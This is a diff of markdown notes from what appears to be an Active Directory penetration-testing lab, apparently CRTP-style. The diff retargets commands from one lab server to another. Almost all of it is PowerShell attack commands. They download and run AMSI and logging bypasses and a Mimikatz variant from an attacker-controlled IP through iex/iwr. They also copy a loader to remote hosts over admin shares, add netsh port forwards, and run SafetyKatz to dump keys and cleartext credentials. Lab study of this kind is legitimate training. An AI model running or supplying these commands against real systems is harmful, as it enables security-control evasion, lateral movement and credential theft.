@@ -11,8 +11,6 @@ ls env
 
 ```powershell
 iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb)
-
-$null | winrs -r:dcorp-appsrv powershell -c "iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.48/amsibypass.txt -useb);iex (iwr http://172.16.100.48/Invoke-MimiEx-vault.ps1 -useb);"
 ```
 
 ```powershell
@@ -42,14 +40,16 @@ $null | winrs -r:dcorp-mgmt "powershell /c Get-Process -IncludeUserName"
 ### Lateral 1 (Local Admin)
 Add port forward to machine to forwards to webserver - downloading executable is bad
 ```powershell
-echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-appsrv\C$\Users\Public\Loader.exe
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mssql.dollarcorp.moneycorp.LOCAL\C$\Users\Public\Loader.exe
 
-$null | winrs -r:dcorp-appsrv "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
+$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
 ```
 
 Download from local loopback
 ```powershell
-$null | winrs -r:dcorp-appsrv "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
+$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args sekurlsa::evasive-keys exit"
+
+$null | winrs -r:dcorp-mssql.dollarcorp.moneycorp.LOCAL powershell -c "iex (iwr http://172.16.100.48/sbloggingbypass.txt -useb);iex (iwr http://172.16.100.48/amsibypass.txt -useb);iex (iwr http://172.16.100.48/Invoke-MimiEx-vault.ps1 -useb);"
 ```
 
 Note down the `aes256_hmac` and the cleartext credentials 
